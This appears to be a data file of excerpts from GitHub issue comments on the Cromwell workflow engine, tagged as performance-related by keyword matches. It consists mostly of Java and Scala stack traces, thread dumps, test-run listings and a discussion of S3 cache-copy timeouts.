20:04:45,145 cromwell-system-akka.actor.default-dispatcher-16 INFO - WorkflowActor [UUID(129f0510)]: persisting status of CollectQualityYieldMetrics:2 to Failed.; 3589874:2016-04-24 20:04:45,145 cromwell-system-akka.actor.default-dispatcher-16 ERROR - WorkflowActor [UUID(129f0510)]: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:4205,concurren,concurrent,4205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,4,['concurren'],['concurrent']
Performance,"e: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2476,concurren,concurrent,2476,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"e: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1599,concurren,concurrent,1599,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,eLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; 905196- at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; 905197- at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; 905198- at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; 905199- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905200- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905201- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; 905202- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; 905203- at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; 905204- at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; 905205- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 905206- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 905207- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 905208- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 905209- at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; 905210- at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; 905211- at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; 905212- at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; 905,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:6458,concurren,concurrent,6458,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,1,['concurren'],['concurrent']
Performance,"ead.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:4163,concurren,concurrent,4163,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['concurren'],['concurrent']
Performance,eater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.con,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:4893,concurren,concurrent,4893,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,2,['concurren'],['concurrent']
Performance,"eater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5(HealthMonitorServiceActorSpec.scala:48); at scala.collection.immutable.List.map(List.scala:283); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$1(HealthMon",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:5619,concurren,concurrent,5619,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['concurren'],['concurrent']
Performance,"econds); - should successfully run standard_output_paths_colliding_prevented *** FAILED *** (3 minutes, 1 second); - should successfully run three_step_cwl *** FAILED *** (5 minutes, 29 seconds); - should NOT call cache the second run of readFromCacheFalse (3 minutes, 21 seconds); - should abort a workflow immediately after submission abort.instant_abort (5 seconds, 52 milliseconds); - should abort a workflow mid run abort.scheduled_abort (2 minutes, 20 seconds); - should abort a workflow mid run abort.sub_workflow_abort (3 minutes, 2 seconds); - should call cache the second run of cacheBetweenWF (2 minutes, 55 seconds); - should call cache the second run of call_cache_hit_prefixes_no_hint (1 minute, 40 seconds); - should call cache the second run of floating_tags (3 minutes, 25 seconds); - should fail during execution bad_docker_name (35 seconds, 238 milliseconds); - should fail during execution bad_workflow_failure_mode (5 seconds, 920 milliseconds); - should fail during execution chainfail (42 seconds, 454 milliseconds); - should fail during execution cont_while_possible (3 minutes, 57 seconds); - should fail during execution cont_while_possible_scatter (2 minutes, 27 seconds); - should fail during execution draft3_read_file_limits (3 minutes, 26 seconds); - should fail during execution empty_filename (16 seconds, 333 milliseconds); - should fail during execution failing_continue_on_return_code (55 seconds, 180 milliseconds); - should fail during execution failures.terminal_status (2 minutes, 55 seconds); - should fail during execution import_passwd (5 seconds, 348 milliseconds); - should fail during execution import_passwd_url (5 seconds, 610 milliseconds); - should fail during execution invalid_return_code (45 seconds, 607 milliseconds); - should fail during execution invalid_runtime_attributes (15 seconds, 637 milliseconds); - should fail during execution invalid_wdl (10 seconds, 626 milliseconds); - should fail during execution invalid_workflow_url (6 seconds,",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:2799,cache,cache,2799,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,4,['cache'],"['cache', 'cacheBetweenWF']"
Performance,"ecute(BatchRequest.java:241); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.runBatch(JesPollingActor.scala:67); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.cromwell$backend$impl$jes$statuspolling$JesPollingActor$$handleBatch(JesPollingActor.scala:58); at cromwell.backend.impl.jes.statuspolling.JesPollingActor$$anonfun$receive$1.applyOrElse(JesPollingActor.scala:36); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.aroundReceive(JesPollingActor.scala:22); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-28 14:37:35,25] [error] The JES polling actor Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$c/$a/$a#551868791] unexpectedly terminated while conducting 5 polls. Making a new one...; [2016-10-28 14:37:35,25] [info] watching Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$c/$a/$b#797880880]; [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:4402,concurren,concurrent,4402,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,edValues.foreach(MapLike.scala:245) ~[cromwell.jar:0.19]; 905193- at scala.collection.TraversableLike$WithFilter.foreach(TraversableLike.scala:777) ~[cromwell.jar:0.19]; 905194- at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:245) ~[cromwell.jar:0.19]; 905195- at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; 905196- at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; 905197- at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; 905198- at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; 905199- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905200- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905201- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; 905202- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; 905203- at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; 905204- at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; 905205- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 905206- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 905207- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 905208- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 905209- at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; 905210- at scala.concurrent.impl.ExecutionCo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:6152,concurren,concurrent,6152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,1,['concurren'],['concurrent']
Performance,"efore the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1147,tune,tune,1147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,1,['tune'],['tune']
Performance,"ell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email di",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:1876,cache,cache,1876,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['cache'],['cache']
Performance,"ell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 504 Gateway Time-out; {; ""code"" : 504,; ""erro",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:6181,concurren,concurrent,6181,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,"end.jes.JesBackend$$anonfun$getOutputFoldingFunction$1.apply(JesBackend.scala:675) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$getOutputFoldingFunction$1.apply(JesBackend.scala:674) ~[cromwell.jar:0.19]; at scala.collection.LinearSeqOptimized$class.foldLeft(LinearSeqOptimized.scala:124) ~[cromwell.jar:0.19]; at scala.collection.immutable.List.foldLeft(List.scala:84) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend.postProcess(JesBackend.scala:665) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:700) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at 